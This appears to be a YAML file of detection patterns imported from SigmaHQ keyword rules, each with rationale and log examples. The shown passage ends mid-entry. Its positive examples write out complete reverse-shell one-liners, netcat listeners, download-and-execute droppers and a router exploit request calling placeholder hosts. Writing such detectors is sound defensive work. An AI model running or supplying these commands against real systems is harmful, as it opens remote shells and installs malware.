# Mention patterns imported from SigmaHQ rules whose detection is a free-text `keywords` list (Linux builtin logs,
# web server and application logs, Cisco AAA command accounting). Rules are read at SigmaHQ commit
# 698f0912f571d5fac3bf8c51f5421139834a011c and imported under the Detection Rule License 1.1 (attribution: the rule
# author and the upstream rule id in each entry's source).
#
# Import notes:
# - Sigma keywords match case-insensitively, so every entry here is case_sensitive: false unless a narrower reading
#   is stated in the rationale.
# - A keyword containing `*` becomes an anchored pattern with a bounded gap ([^\n]{0,N}) in place of the wildcard.
# - Keywords that are too short or too common to be a useful mention are left out; the rationale of the entry for
#   that rule names what was left out.
# - A rule's keywords are split across several entries when their benign rates differ (strong, medium, weak).
# - Each line that matches is a mention: it says the text was seen, never that the action ran.

- id: mention.sigma_reverse_shell_cmdline
  title: Reverse shell one-liner text (Sigma "Suspicious Reverse Shell Command Line")
  match:
    literal:
      - 'BEGIN {s = "/inet/tcp/0/'
      - 'bash -i >& /dev/tcp/'
      - 'bash -i >& /dev/udp/'
      - 'sh -i >$ /dev/udp/'
      - 'sh -i >$ /dev/tcp/'
      - '&& while read line 0<&5; do'
      - '/bin/bash -c exec 5<>/dev/tcp/'
      - '/bin/bash -c exec 5<>/dev/udp/'
      - 'nc -e /bin/sh '
      - '/bin/sh | nc'
      - 'rm -f backpipe; mknod /tmp/backpipe p && nc '
      - ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'
      - ';STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
      - '/bin/sh -i <&3 >&3 2>&3'
      - 'uname -a; w; id; /bin/bash -i'
      - '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};'
      - ';os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(''HISTFILE'',''/dev/null'');'
      - '.to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
      - ';while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print'
      - 'socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:'
      - 'rm -f /tmp/p; mknod /tmp/p p &&'
      - ' | /bin/bash | telnet '
      - ',echo=0,raw tcp-listen:'
  case_sensitive: false
  strength: strong
  attack: [T1059.004, T1095]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Suspicious Reverse Shell Command Line (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
    license: DRL-1.1
    upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
  rationale: >-
    Each string is a fragment of a published reverse-shell one-liner (bash /dev/tcp redirection, perl/python/ruby
    socket shells, socat and mknod/telnet pipes, the PowerShell TCP client loop). Administrators have no reason to
    type these exact fragments; the realistic benign source is training material or a pasted cheat sheet in a ticket
    or chat log. The listener ('nc -lvvp ') and 'xterm -display 1' keywords of the same rule are split into
    separate medium and weak entries because they have ordinary uses.
  examples:
    positive:
      - 'Nov 20 10:01:02 web01 bash[4242]: HISTORY: PID=4242 UID=33 bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'
      - 'audit: cmdline="python3 -c import socket,os;s=socket.socket();s.connect((\"203.0.113.7\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(''HISTFILE'',''/dev/null'');"'
      - 'Nov 20 10:05:00 app02 sh[311]: rm -f /tmp/p; mknod /tmp/p p && telnet 198.51.100.4 80 0</tmp/p | /bin/bash 1>/tmp/p'
      - 'Nov 21 09:00:01 web01 bash[4100]: HISTORY: awk ''BEGIN {s = "/inet/tcp/0/203.0.113.7/4444"; while(42) {}}'' /dev/null'
      - 'Nov 21 09:00:02 web01 bash[4100]: HISTORY: bash -i >& /dev/udp/203.0.113.7/4444 0>&1'
      - 'Nov 21 09:00:03 web01 bash[4100]: HISTORY: sh -i >$ /dev/udp/203.0.113.7/4444 0>&1'
      - 'Nov 21 09:00:04 web01 bash[4100]: HISTORY: sh -i >$ /dev/tcp/203.0.113.7/4444 0>&1'
      - 'Nov 21 09:00:05 web01 bash[4100]: HISTORY: exec 5<>/dev/tcp/203.0.113.7/4444 && while read line 0<&5; do $line 2>&5 >&5; done'
      - 'Nov 21 09:00:06 web01 bash[4100]: HISTORY: /bin/bash -c exec 5<>/dev/tcp/203.0.113.7/4444 0>&1'
      - 'Nov 21 09:00:07 web01 bash[4100]: HISTORY: /bin/bash -c exec 5<>/dev/udp/203.0.113.7/4444 0>&1'
      - 'Nov 21 09:00:08 web01 bash[4100]: HISTORY: nc -e /bin/sh 203.0.113.7 4444'
      - 'Nov 21 09:00:09 web01 bash[4100]: HISTORY: /bin/sh | nc 203.0.113.7 4444'
      - 'Nov 21 09:00:10 web01 bash[4100]: HISTORY: rm -f backpipe; mknod /tmp/backpipe p && nc 203.0.113.7 4444'
      - 'Nov 21 09:00:11 web01 bash[4100]: HISTORY: perl -e ''use Socket;$i="203.0.113.7";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");exec("/bin/sh -i");};'''
      - 'Nov 21 09:00:12 web01 bash[4100]: HISTORY: perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"203.0.113.7:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'''
      - 'Nov 21 09:00:13 web01 bash[4100]: HISTORY: /bin/sh -i <&3 >&3 2>&3'
      - 'Nov 21 09:00:14 web01 bash[4100]: HISTORY: uname -a; w; id; /bin/bash -i'
      - 'powershell -nop -c "... $sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};"'
      - 'Nov 21 09:00:15 web01 bash[4100]: HISTORY: ruby -rsocket -e''f=TCPSocket.open("203.0.113.7",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'''
      - 'Nov 21 09:00:16 web01 bash[4100]: HISTORY: ruby -rsocket -e ''c=TCPSocket.new("203.0.113.7","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'''
      - 'Nov 21 09:00:17 web01 bash[4100]: HISTORY: socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:203.0.113.7:4444'
      - 'Nov 21 09:00:18 web01 bash[4100]: HISTORY: telnet 203.0.113.7 8080 | /bin/bash | telnet 203.0.113.7 8081'
      - 'Nov 21 09:00:19 web01 bash[4100]: HISTORY: socat file:`tty`,echo=0,raw tcp-listen:4444'
    negative:
      - 'Nov 20 10:06:00 app02 sudo[9930]: alice : COMMAND=/usr/bin/nc -zv db01 5432'
      - 'Nov 20 10:07:00 app02 bash[812]: HISTORY: PID=812 UID=1000 bash -i ./deploy.sh --env staging'
      - 'Nov 20 10:08:00 app02 healthcheck: timeout 2 bash -c "</dev/tcp/127.0.0.1/8080" && echo ok'

- id: mention.sigma_reverse_shell_listener
  title: Verbose netcat listener (Sigma "Suspicious Reverse Shell Command Line", listener keyword)
  match:
    literal: ['nc -lvvp ']
  case_sensitive: false
  strength: medium
  attack: [T1059.004, T1095]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Suspicious Reverse Shell Command Line (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
    license: DRL-1.1
    upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
  rationale: >-
    A verbose netcat listener on a fixed port is the catching side of a reverse shell or a bind shell. Engineers also
    open quick netcat listeners to test firewall paths, so this is medium, not strong.
  examples:
    positive:
      - 'Nov 20 11:00:00 jump01 bash[777]: HISTORY: PID=777 UID=0 nc -lvvp 4444'
    negative:
      - 'Nov 20 11:01:00 jump01 bash[777]: HISTORY: PID=777 UID=0 nc -l 9000 > /tmp/image.tar'
      - 'Nov 20 11:02:00 jump01 bash[777]: HISTORY: PID=777 UID=0 ncat --listen --keep-open 8443 --ssl'

- id: mention.sigma_reverse_shell_xterm_display
  title: 'xterm -display 1 text (Sigma "Suspicious Reverse Shell Command Line", xterm keyword)'
  match:
    literal: ['xterm -display 1']
  case_sensitive: false
  strength: weak
  attack: [T1059.004]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Suspicious Reverse Shell Command Line (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
    license: DRL-1.1
    upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
  rationale: >-
    xterm pointed at a remote X display is a classic reverse shell, but the keyword also matches local displays such as
    127.0.0.1:0 and remote-desktop setups, so it is a weak candidate.
  examples:
    positive:
      - 'Nov 20 11:03:00 lab01 bash[910]: HISTORY: PID=910 UID=33 xterm -display 198.51.100.9:1'
    negative:
      - 'Nov 20 11:04:00 lab01 bash[910]: HISTORY: PID=910 UID=1000 xterm -geometry 80x24'
      - 'Nov 20 11:05:00 lab01 Xorg[600]: (II) xterm display :0 started for user alice'

- id: mention.sigma_dev_tcp_shell
  title: 'Shell redirection onto /dev/tcp (Sigma "Suspicious Use of /dev/tcp", shell keywords)'
  match:
    literal:
      - '0<&196;exec 196<>/dev/tcp/'
      - '(sh)0>/dev/tcp/'
      - 'bash -c ''bash -i >& /dev/tcp/'
      - 'echo -e ''#!/bin/bash\nbash -i >& /dev/tcp/'
      - 'sh -i >& /dev/udp/'
  case_sensitive: false
  strength: strong
  attack: [T1059.004, T1095]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Suspicious Use of /dev/tcp (frack113)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_susp_dev_tcp.yml
    license: DRL-1.1
    upstream_id: 6cc5fceb-9a71-4c23-aeeb-963abe0b279c
  rationale: >-
    These keywords attach an interactive shell's file descriptors to a bash /dev/tcp or /dev/udp socket, which is the
    reverse-shell idiom; benign health checks open /dev/tcp only to test a port. The rule's 'bash -i >& /dev/tcp/'
    keyword is carried by mention.sigma_reverse_shell_cmdline, and its fd-open and probe keywords are separate medium
    and weak entries.
  examples:
    positive:
      - 'Nov 20 12:00:00 web01 bash[5011]: HISTORY: 0<&196;exec 196<>/dev/tcp/203.0.113.7/443; sh <&196 >&196 2>&196'
      - 'Nov 20 12:01:00 web01 php-fpm[880]: exec("bash -c ''bash -i >& /dev/tcp/203.0.113.7/80 0>&1''")'
      - 'Nov 21 09:00:20 web01 bash[4100]: HISTORY: (sh)0>/dev/tcp/203.0.113.7/4444 0>&1'
      - 'Nov 21 09:00:21 web01 bash[4100]: HISTORY: echo -e ''#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1'
      - 'Nov 21 09:00:22 web01 bash[4100]: HISTORY: sh -i >& /dev/udp/203.0.113.7/4444 0>&1'
    negative:
      - 'Nov 20 12:02:00 web01 healthcheck: bash -c "echo > /dev/tcp/127.0.0.1/5432" && echo db up'
      - 'Nov 20 12:03:00 web01 bash[5011]: HISTORY: exec 3<>/dev/null; echo done'

- id: mention.sigma_dev_tcp_fd
  title: 'Numbered-descriptor open of bash /dev/tcp (Sigma "Suspicious Use of /dev/tcp", fd keywords)'
  match:
    literal: ['cat </dev/tcp/', 'exec 3<>/dev/tcp/', 'exec 5<>/dev/tcp/']
  case_sensitive: false
  strength: medium
  attack: [T1059.004, T1095, T1046]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Suspicious Use of /dev/tcp (frack113)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_susp_dev_tcp.yml
    license: DRL-1.1
    upstream_id: 6cc5fceb-9a71-4c23-aeeb-963abe0b279c
  rationale: >-
    Opening a bash /dev/tcp socket on a numbered descriptor is how shell-only reverse shells, port scanners and
    download-without-curl tricks start. Minimal containers also use it for HTTP health checks, so it is medium.
  examples:
    positive:
      - 'Nov 20 12:04:00 web01 bash[5012]: HISTORY: exec 5<>/dev/tcp/203.0.113.7/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'
      - 'Nov 20 12:05:00 web01 bash[5013]: HISTORY: cat </dev/tcp/203.0.113.7/8000 > /tmp/.x'
    negative:
      - 'Nov 20 12:06:00 web01 bash[5014]: HISTORY: exec 3>&1 4>&2'
      - 'Nov 20 12:07:00 web01 bash[5015]: HISTORY: cat /var/log/nginx/access.log | tail -n 20'

- id: mention.sigma_dev_tcp_probe
  title: Port probe through bash /dev/tcp (Sigma "Suspicious Use of /dev/tcp", probe keyword)
  match:
    literal: ['echo >/dev/tcp/']
  case_sensitive: false
  strength: weak
  attack: [T1046]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Suspicious Use of /dev/tcp (frack113)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_susp_dev_tcp.yml
    license: DRL-1.1
    upstream_id: 6cc5fceb-9a71-4c23-aeeb-963abe0b279c
  rationale: >-
    Writing nothing to /dev/tcp/host/port tests whether a port is open. Attackers use it for scanning from shells
    without tools, and wait-for-port scripts use it constantly, so it is a weak candidate.
  examples:
    positive:
      - 'Nov 20 12:08:00 web01 bash[5016]: HISTORY: for p in 22 80 443; do echo >/dev/tcp/10.0.0.5/$p && echo $p open; done'
    negative:
      - 'Nov 20 12:09:00 web01 bash[5017]: HISTORY: echo hello > /tmp/test.txt'
      - 'Nov 20 12:10:00 web01 bash[5018]: HISTORY: nc -z 10.0.0.5 22'

- id: mention.sigma_shell_wget_pipe_interpreter
  title: 'wget with a pipe into a shell or perl (Sigma "Suspicious Activity in Shell Commands")'
  match:
    anchored: 'wget [^\n]{0,150} - http[^\n]{0,200} \| (?:perl|sh|bash)'
  case_sensitive: false
  strength: medium
  attack: [T1105, T1059.004]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
    license: DRL-1.1
    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
  rationale: >-
    Translation of the keywords 'wget * - http* | perl|sh|bash' with bounded gaps. Fetching a script to stdout and
    piping it into an interpreter is the classic dropper. Some vendor installers are published the same way, so the
    mention is medium; the URL host and what runs next decide it.
  examples:
    positive:
      - 'Nov 20 12:11:00 web01 bash[5019]: HISTORY: wget -q -O - http://203.0.113.7/x.sh | sh'
    negative:
      - 'Nov 20 12:12:00 web01 bash[5020]: HISTORY: wget -O /tmp/release.tar.gz https://downloads.example.org/release.tar.gz'
      - 'Nov 20 12:13:00 web01 bash[5021]: HISTORY: wget -q -O - https://repo.example.org/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg'

- id: mention.sigma_shell_python_http_server
  title: Python ad-hoc HTTP server (Sigma "Suspicious Activity in Shell Commands")
  match:
    literal: ['python -m SimpleHTTPServer', '-m http.server']
  case_sensitive: false
  strength: weak
  attack: [T1105]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
    license: DRL-1.1
    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
  rationale: >-
    A throwaway Python web server is how intruders stage tools or pull files off a host, but developers use it every
    day to share a directory, so it is a weak candidate.
  examples:
    positive:
      - 'Nov 20 12:14:00 web01 bash[5022]: HISTORY: cd /dev/shm && python3 -m http.server 8081'
    negative:
      - 'Nov 20 12:15:00 web01 bash[5023]: HISTORY: python3 -m pip install --user httpie'
      - 'Nov 20 12:16:00 web01 gunicorn[700]: [INFO] Listening at: http://0.0.0.0:8000 (700)'

- id: mention.sigma_shell_pty_spawn
  title: Python pty.spawn shell upgrade (Sigma "Suspicious Activity in Shell Commands")
  match:
    literal: ['import pty; pty.spawn']
  case_sensitive: false
  strength: strong
  attack: [T1059.006]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
    license: DRL-1.1
    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
  rationale: >-
    'import pty; pty.spawn' is the standard way to turn a dumb reverse shell into an interactive terminal. Ordinary
    administration has no use for it; the realistic benign source is a cheat sheet quoted in a ticket.
  examples:
    positive:
      - 'Nov 20 12:17:00 web01 bash[5024]: HISTORY: python -c ''import pty; pty.spawn("/bin/bash")'''
    negative:
      - 'Nov 20 12:18:00 web01 bash[5025]: HISTORY: python3 -c "import platform; print(platform.release())"'
      - 'Nov 20 12:19:00 web01 bash[5026]: HISTORY: script -q /tmp/session.log'

- id: mention.sigma_shell_socat_exec
  title: 'socat exec: or socat -O /tmp/ text (Sigma "Suspicious Activity in Shell Commands")'
  match:
    literal: ['socat exec:', 'socat -O /tmp/']
  case_sensitive: false
  strength: strong
  attack: [T1059.004, T1095]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
    license: DRL-1.1
    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
  rationale: >-
    socat with an EXEC address as its first argument binds a program, usually a shell, to a network stream; this is
    the full-TTY reverse or bind shell. Plain socat port forwarding (TCP-LISTEN to TCP) does not match.
  examples:
    positive:
      - 'Nov 20 12:20:00 web01 bash[5027]: HISTORY: socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:203.0.113.7:4444'
      - 'Nov 21 09:00:23 web01 bash[4100]: HISTORY: socat -O /tmp/.x tcp:203.0.113.7:4444'
    negative:
      - 'Nov 20 12:21:00 web01 systemd[1]: Started socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock'
      - 'Nov 20 12:22:00 web01 bash[5028]: HISTORY: socat - TCP:db01:5432'

- id: mention.sigma_shell_socat_connect
  title: socat outbound TCP connect (Sigma "Suspicious Activity in Shell Commands")
  match:
    literal: ['socat tcp-connect']
  case_sensitive: false
  strength: medium
  attack: [T1095, T1090]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
    license: DRL-1.1
    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
  rationale: >-
    socat starting with an outbound TCP-CONNECT address is used for relays and reverse shells; it is also a common
    admin relay, so it is medium.
  examples:
    positive:
      - 'Nov 20 12:23:00 web01 bash[5029]: HISTORY: socat tcp-connect:203.0.113.7:443 exec:/bin/sh'
    negative:
      - 'Nov 20 12:24:00 web01 bash[5030]: HISTORY: socat TCP-LISTEN:8080,fork TCP:10.0.0.8:80'
      - 'Nov 20 12:25:00 web01 bash[5031]: HISTORY: socat -d -d pty,raw,echo=0 pty,raw,echo=0'

- id: mention.sigma_shell_wget_chmod
  title: 'wget and chmod on one line (Sigma "Suspicious Activity in Shell Commands")'
  match:
    anchored: 'wget [^\n]{1,200}; chmod (?:\+x|777 )'
  case_sensitive: false
  strength: medium
  attack: [T1105, T1222.002]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
    license: DRL-1.1
    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
  rationale: >-
    Translation of '*wget *; chmod +x*' and '*wget *; chmod 777 *'. Download-then-make-executable in one command line
    is the botnet and cryptominer dropper shape seen in honeypot and exploit logs, but admins fetch and run vendor
    bootstrap scripts the same way, so it is medium here (high upstream); the URL host and target path decide.
  examples:
    positive:
      - 'Nov 20 12:26:00 web01 bash[5032]: HISTORY: cd /tmp; wget http://203.0.113.7/bins/x86; chmod 777 x86; ./x86'
      - 'GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget http://198.51.100.2/m.sh; chmod +x m.sh; ./m.sh) HTTP/1.1'
    negative:
      - 'Nov 20 12:27:00 web01 bash[5033]: HISTORY: wget https://downloads.example.org/tool.tar.gz && tar xzf tool.tar.gz'
      - 'Nov 20 12:28:00 web01 bash[5034]: HISTORY: chmod +x ./deploy.sh; ./deploy.sh'

- id: mention.sigma_shell_exploit_staging
